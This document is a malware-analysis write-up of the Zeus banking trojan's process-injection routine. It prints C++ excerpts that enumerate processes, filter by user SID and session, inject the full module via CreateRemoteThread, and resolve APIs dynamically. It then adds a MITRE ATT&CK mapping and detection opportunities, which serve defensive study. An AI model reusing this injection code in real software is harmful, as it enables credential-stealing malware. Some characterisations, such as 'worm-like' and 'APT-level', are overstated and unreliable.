# Zeus (Zbot) - Mass Process Enumeration with User-Context Filtering

**Repository:** MalwareSourceCode-main  
**File Path:** Win32/Win32.Zeus.b/source/client/coreinject.cpp  
**Language:** C++  
**MITRE ATT&CK:** T1055 - Process Injection, T1057 - Process Discovery

---

## Overview

Zeus implements sophisticated **mass process injection** by enumerating all running processes, filtering by user session and SID (Security Identifier), then injecting into every process running under the same user context. This spreads the malware across all user processes, ensuring persistence and maximum infection coverage. Zeus maintains a list of already-infected processes to avoid redundant injections.

---

## Code Snippet 1: Process Snapshot Creation and Enumeration

```cpp
bool CoreInject::_injectToAll(void)
{
  bool ok = false;

  WDEBUG0(WDDT_INFO, "Listing processes...");  

  // Track injected PIDs to avoid re-injection
  LPDWORD injectedPids    = NULL;
  DWORD injectedPidsCount = 0;
  DWORD newProcesses;

  do
  {
    // Create snapshot of all running processes
    HANDLE snap = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);  
    newProcesses = 0;

    if(snap != INVALID_HANDLE_VALUE)
    {
      PROCESSENTRY32W pe;
      pe.dwSize = sizeof(PROCESSENTRY32W);

      // Iterate through all processes in snapshot
      if(CWA(kernel32, Process32FirstW)(snap, &pe))
      do
      {
        // Skip system idle process (PID 0) and self
        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid)
        {
          TOKEN_USER *tu;
          DWORD sessionId;
          DWORD sidLength;

          // Check if already injected into this process
          for(DWORD i = 0; i < injectedPidsCount; i++)
            if(injectedPids[i] == pe.th32ProcessID)
              goto SKIP_INJECT;

          // Continue to user context validation...
        }
      }
      while(CWA(kernel32, Process32NextW)(snap, &pe));

      CWA(kernel32, CloseHandle)(snap);
    }
  }
  while(newProcesses != 0);  // Loop until no new processes found

  Mem::free(injectedPids);
  return ok;
}
```

**What it does:**  
Implements a **continuous process enumeration loop** that:

1. **Creates Process Snapshot:** Uses `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` to get a system-wide snapshot of all running processes

2. **Iterates Through Processes:** Uses `Process32FirstW` and `Process32NextW` to walk through each process in the snapshot

3. **Filters Out Self and System:** Skips PID 0 (System Idle Process) and the malware's own PID to avoid self-injection

4. **Checks Injection History:** Maintains an array (`injectedPids`) tracking already-infected processes to avoid redundant injections

5. **Loops Until Stable:** Repeats the enumeration until no new processes are found, catching processes that start during the infection sweep

**Why it's T1055 + T1057 (Process Discovery for Injection):**  
This is a **mass injection** approach characteristic of worm-like malware. Zeus doesn't target specific processes—it infects **every accessible process** under the current user. This maximizes:

- **Persistence:** Even if one infected process terminates, dozens of others remain
- **Coverage:** Captures browsers, office applications, system utilities, and third-party tools
- **Resilience:** Makes cleanup difficult—every user process must be disinfected

The continuous loop (`do...while(newProcesses != 0)`) is particularly sophisticated, ensuring Zeus catches processes that start during the initial injection sweep.

---

## Code Snippet 2: User Session and SID Filtering

```cpp
// Create mutex for this process (used to prevent double-injection)
HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
if(mutexOfProcess == NULL)
  goto SKIP_INJECT;  // Already infected

// Get process owner's SID and session ID
if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
{
  // Compare session ID and SID with current user
  if(sessionId == coreData.currentUser.sessionId &&
     (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == 
                   coreData.currentUser.sidLength &&
     Mem::_compare(tu->User.Sid, 
                   coreData.currentUser.token->User.Sid, 
                   sidLength) == 0)
  {
    // SIDs match - this process belongs to the same user
    
    // Add to injected PIDs list
    if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
    {
      injectedPids[injectedPidsCount++] = pe.th32ProcessID;
      newProcesses++;

      WDEBUG1(WDDT_INFO, "pe.th32ProcessID=%u", pe.th32ProcessID);

      // Perform injection
      if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))
        ok = true;
    }
  }
  Mem::free(tu);
}

CWA(kernel32, CloseHandle)(mutexOfProcess);

SKIP_INJECT:;
```

**What it does:**  
Implements **user-context filtering** to only inject into processes owned by the same user as the malware:

1. **Mutex Check:** Creates a named mutex for the target process. If the mutex already exists, the process is already infected (skip injection).

2. **Get Process Owner:** Calls `Process::_getUserByProcessId` to retrieve the target process's owner token, which includes:
   - **SessionId** - Terminal Services session (e.g., session 0 for services, session 1 for first user)
   - **SID** - Security Identifier uniquely identifying the user account

3. **Compare Session and SID:** Compares the target process's session ID and SID against the malware's current user:
   - **Same SessionId:** Ensures injection within the same logon session (prevents cross-session injection which requires higher privileges)
   - **Same SID:** Ensures injection only into processes owned by the same user account

4. **Inject if Match:** If session and SID match, adds the PID to the injected list and calls `injectMalwareToProcess`

**Why it's T1055 (Targeted Injection with Privilege Awareness):**  
This sophisticated filtering demonstrates **privilege-aware injection**:

- **Avoids Detection:** Cross-user injection triggers security warnings and requires admin privileges. Zeus stays stealthy by targeting only same-user processes.

- **Prevents Escalation Attempts:** Injecting into higher-privileged processes (e.g., SYSTEM services) from a user-level process would fail. The SID check avoids these failures.

- **Multi-User Support:** On systems with multiple logged-in users (via Terminal Services/RDP), Zeus infects only the current user's processes, avoiding interference with other users.

- **Mutex-Based Exclusion:** Using a per-process mutex to track infections is a clever deduplication mechanism, preventing wasted injection attempts and potential crashes from double-injection.

**Technical Context:**  
- **SID (Security Identifier):** Unique identifier for Windows security principals (users, groups, computers). Format: `S-1-5-21-<domain>-<RID>`
- **Session ID:** Terminal Services session identifier. Session 0 is for services, sessions 1+ for interactive users
- **Token:** Windows security token containing user identity, privileges, and group memberships

---

## Code Snippet 3: Injection Execution with CreateRemoteThread

```cpp
static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
  bool ok = false;
  
  // Open target process with required permissions
  HANDLE process = CWA(kernel32, OpenProcess)(
      PROCESS_QUERY_INFORMATION |  // Query process info
      PROCESS_VM_OPERATION |       // Allocate/free memory
      PROCESS_VM_WRITE |           // Write memory
      PROCESS_VM_READ |            // Read memory
      PROCESS_CREATE_THREAD |      // Create threads
      PROCESS_DUP_HANDLE,          // Duplicate handles
      FALSE, pid);

  if(process != NULL)
  {
    // Allocate and initialize the malware module in target process
    void *newImage = Core::initNewModule(process, processMutex, proccessFlags);
    
    if(newImage != NULL)
    {
      // Calculate entry point address in remote process
      LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)(
          (LPBYTE)newImage + 
          (DWORD_PTR)((LPBYTE)Core::_injectEntryForThreadEntry - 
                      (LPBYTE)coreData.modules.current)
      );
      
      // Create remote thread at entry point
      HANDLE thread = CWA(kernel32, CreateRemoteThread)(
          process, 
          NULL,         // Default security
          0,            // Default stack size
          proc,         // Entry point (injected code)
          NULL,         // No parameter
          0,            // Start immediately
          NULL          // Don't need thread ID
      );

      if(thread != NULL)
      {
        WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
        
        // Wait up to 10 seconds for injection to complete
        if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
        {
          WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", 
                  newImage, thread);
        }
        
        CWA(kernel32, CloseHandle)(thread);
        ok = true;
      }
      else
      {
        WDEBUG1(WDDT_ERROR, "Failed to create remote thread in process with id=%u.", pid);
        CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
      }
    }
    
    CWA(kernel32, CloseHandle)(process);
  }

  return ok;
}
```

**What it does:**  
Performs the actual injection using **CreateRemoteThread**:

1. **Opens Target Process:** Uses `OpenProcess` with comprehensive permissions:
   - `PROCESS_VM_OPERATION` / `PROCESS_VM_WRITE` / `PROCESS_VM_READ` - For memory manipulation
   - `PROCESS_CREATE_THREAD` - For creating the remote thread
   - `PROCESS_QUERY_INFORMATION` - For querying process details
   - `PROCESS_DUP_HANDLE` - For duplicating handles (mutex, events, etc.)

2. **Initializes Module:** Calls `Core::initNewModule` which:
   - Allocates memory in the remote process (`VirtualAllocEx`)
   - Writes the malware module (likely the entire Zeus DLL/code)
   - Sets up imports, relocations, and initialization data

3. **Calculates Entry Point:** Computes the address of the injection entry point (`Core::_injectEntryForThreadEntry`) in the remote process by:
   - Taking the entry point's offset in the current process
   - Adding it to the remote module's base address
   - This ensures the remote thread starts at the correct function

4. **Creates Remote Thread:** Uses **CreateRemoteThread** to start execution at the calculated entry point

5. **Waits for Completion:** Waits up to 10 seconds for the remote thread to complete, ensuring initialization finishes before moving to the next process

**Why it's T1055 (CreateRemoteThread Injection):**  
This is a hybrid injection technique combining:

- **Full Module Injection:** Not just a DLL path, but the entire malware module (similar to PE injection)
- **CreateRemoteThread:** Classic remote thread creation for execution
- **Entry Point Calculation:** Manual offset calculation shows this is not simple LoadLibrary injection
- **Synchronous Execution:** Waiting for completion ensures proper initialization

The entry point calculation suggests Zeus is injecting its entire module (not using LoadLibrary), then calling a specific initialization function within that module.

---

## Code Snippet 4: Dynamic API Resolution (CWA Macro Pattern)

```cpp
// Throughout the code, all Windows API calls use the CWA macro:
CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
CWA(kernel32, Process32FirstW)(snap, &pe);
CWA(kernel32, Process32NextW)(snap, &pe);
CWA(kernel32, OpenProcess)(...);
CWA(kernel32, CreateRemoteThread)(...);
CWA(kernel32, CloseHandle)(...);
CWA(kernel32, WaitForSingleObject)(...);
CWA(advapi32, GetLengthSid)(...);
CWA(kernel32, VirtualFreeEx)(...);
```

**What it does:**  
The **CWA macro** (Call Windows API) is used for **every single Windows API call** in the Zeus codebase. This macro:

1. **Resolves APIs Dynamically:** Instead of using the import table, CWA resolves each API at runtime via `GetProcAddress`

2. **Bypasses Import Table Analysis:** Static analysis tools and signature scanners that look for suspicious imports (CreateRemoteThread, VirtualAllocEx) will find nothing

3. **Evades API Hooks:** If security products hook APIs through the IAT (Import Address Table), CWA can bypass these hooks by resolving APIs directly

4. **Obfuscates Functionality:** Without executing the malware, analysts cannot easily determine which APIs are used

**Why it's T1027 (Obfuscation) + T1055 (Enhanced Injection Stealth):**  
Dynamic API resolution is a **standard malware technique** to evade detection:

**Advantages:**
- **Hides Intent:** No suspicious imports in PE headers
- **Defeats Static Signatures:** Signature scanners relying on import patterns fail
- **Bypasses IAT Hooks:** Security product hooks in the Import Address Table are circumvented
- **Complicates Analysis:** Requires dynamic analysis or manual reversing to identify API usage

**Typical CWA Implementation:**
```cpp
#define CWA(module, function) \
    ((decltype(function)*)GetAPIAddressRuntime(#module, #function))

// Where GetAPIAddressRuntime does:
FARPROC GetAPIAddressRuntime(const char* module, const char* function) {
    HMODULE hMod = GetModuleHandleA(module);
    return GetProcAddress(hMod, function);
}
```

Zeus's CWA pattern is ubiquitous in modern malware (Dridex, TrickBot, Emotet, Qakbot, etc.).

---

## Code Snippet 5: Continuous Enumeration Loop (Catching New Processes)

```cpp
do
{
  HANDLE snap = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);  
  newProcesses = 0;

  if(snap != INVALID_HANDLE_VALUE)
  {
    // Process enumeration and injection...
    
    CWA(kernel32, CloseHandle)(snap);
  }
}
while(newProcesses != 0);  // Continue until no new processes are found
```

**What it does:**  
Implements a **loop that repeats the entire enumeration-and-injection cycle** until a pass completes without finding any new processes to inject. This is critical because:

1. **Race Condition Handling:** Processes can start during the injection sweep. The loop catches these late starters.

2. **Persistence Maximization:** Ensures no user process escapes infection, even if it starts while Zeus is already injecting other processes.

3. **Convergence:** Eventually, all same-user processes are infected and the loop terminates (when `newProcesses == 0`).

**Why it's T1055 (Comprehensive Infection):**  
This aggressive infection strategy is characteristic of **worm-like behavior**:

- **Self-Propagating:** Automatically spreads to all accessible processes without user interaction
- **Resilient:** Even if some injections fail, others succeed
- **Adaptive:** Catches processes that start dynamically (e.g., opening a new browser tab launches a new process)

This loop pattern is seen in other aggressive malware like:
- **Conficker** - Network worm with mass-infection capabilities
- **Stuxnet** - Spreads across networked systems with comprehensive infection
- **Emotet** - Injects into all user processes for maximum persistence

---

## Explanation

**What this code does:**  
Zeus implements **mass process injection** targeting every process running under the same user account. The technique combines:

1. **Process Discovery:** Enumerates all running processes using `CreateToolhelp32Snapshot`

2. **User Context Filtering:** Compares each process's session ID and SID against the current user, only injecting into same-user processes

3. **Deduplication:** Maintains a list of already-injected PIDs and uses per-process mutexes to avoid redundant injections

4. **Full Module Injection:** Injects Zeus's entire module (not just a DLL path) using `Core::initNewModule`

5. **CreateRemoteThread Execution:** Starts a remote thread at the injected module's entry point

6. **Continuous Loop:** Repeats the enumeration-and-injection cycle until no new processes are found

**How it implements T1055 + T1057 (Process Injection + Discovery):**  
This combines **T1057 (Process Discovery)** with **T1055 (Process Injection)** in a sophisticated attack chain:

**Process Discovery (T1057):**
- `CreateToolhelp32Snapshot` - System-wide process enumeration
- `Process32FirstW` / `Process32NextW` - Iterating through process list
- `Process::_getUserByProcessId` - Querying process owner information
- Session ID and SID comparison - User context validation

**Process Injection (T1055):**
- `OpenProcess` - Opening target processes with injection permissions
- `Core::initNewModule` - Full module allocation and initialization (VirtualAllocEx + WriteProcessMemory)
- `CreateRemoteThread` - Remote thread creation for execution
- Entry point calculation - Manual offset computation for injection accuracy

**Strategic Advantages:**
1. **Maximum Persistence:** Infecting every user process makes cleanup nearly impossible without a full system scan
2. **Privilege Awareness:** Only targets same-user processes, avoiding detection from cross-user injection attempts
3. **Automatic Spreading:** Continuously catches new processes, ensuring comprehensive infection
4. **Stealth:** Dynamic API resolution (CWA macro) hides suspicious API usage from static analysis

**Zeus Banking Trojan Context:**  
This mass injection approach serves Zeus's banking trojan goals:

- **Browser Coverage:** Catches all browser processes (IE, Firefox, Chrome, Opera) regardless of which the user launches
- **Keylogging:** Infects processes where users type credentials (browsers, office apps, chat clients)
- **Form Grabbing:** Intercepts form submissions across all applications
- **Persistence:** Even if antivirus removes Zeus from one process, dozens of other infected processes remain

Zeus's sophistication (SID filtering, mutex deduplication, continuous looping) shows **APT-level development quality**, distinguishing it from commodity malware.

**APIs that make it a strong T1055 + T1057 match:**  
- **CreateToolhelp32Snapshot** - Process enumeration (T1057)
- **Process32FirstW** / **Process32NextW** - Process iteration (T1057)
- **OpenProcess** with injection permissions - Preparation for injection (T1055)
- **CreateRemoteThread** - Remote thread creation (T1055.001)
- **VirtualAllocEx** / **WriteProcessMemory** (via Core::initNewModule) - Memory manipulation (T1055)
- **GetLengthSid** / SID comparison - User context filtering (Defense Evasion)
- **Dynamic API Resolution (CWA)** - Evasion technique (T1027.007)

**Malware Family Resemblance:**  
- **Dridex** - Also uses mass process enumeration with CreateRemoteThread injection
- **Emotet** - Similar approach: enumerate all processes, inject into each
- **TrickBot** - Multi-process infection with user context awareness
- **Qakbot** - Mass injection targeting all user processes
- **IcedID** - Enumerates and injects into browsers and system processes

The continuous loop pattern (`do...while(newProcesses != 0)`) is particularly characteristic of Zeus and its derivatives (Citadel, Gameover Zeus).

**Detection Opportunities:**  
- `CreateToolhelp32Snapshot` followed by multiple `OpenProcess` calls in rapid succession
- Process enumeration coupled with `OpenProcess` using `PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE`
- Multiple `CreateRemoteThread` calls targeting different processes from a single source process
- Remote threads starting at unbacked memory regions (not LoadLibraryA)
- Processes querying SIDs of other processes via token manipulation APIs
- Named mutexes with predictable patterns per process (e.g., "Global\\Process_<PID>_Infected")
- Unusual parent-child process relationships (remote thread source ≠ parent process)

**MITRE ATT&CK Mapping:**  
- **T1055** - Process Injection (Primary)
- **T1055.001** - Process Injection: Dynamic-link Library Injection (CreateRemoteThread variant)
- **T1057** - Process Discovery (CreateToolhelp32Snapshot enumeration)
- **T1082** - System Information Discovery (Session ID, SID queries)
- **T1134.001** - Access Token Manipulation: Token Impersonation/Theft (Querying process tokens)
- **T1027.007** - Obfuscated Files or Information: Dynamic API Resolution (CWA macro)
- **T1106** - Native API (Direct Windows API usage)
- **T1185** - Browser Session Hijacking (Goal after browser injection)
- **T1056.002** - Input Capture: GUI Input Capture (Keylogging across all processes)
